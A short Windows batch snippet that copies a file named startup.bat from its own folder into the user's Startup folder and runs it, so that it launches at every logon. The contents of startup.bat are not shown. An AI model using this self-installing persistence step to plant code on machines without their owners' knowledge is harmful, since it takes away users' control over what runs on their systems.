SET startuppath=%~dp0startup.bat
copy %startuppath% "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
%startuppath%
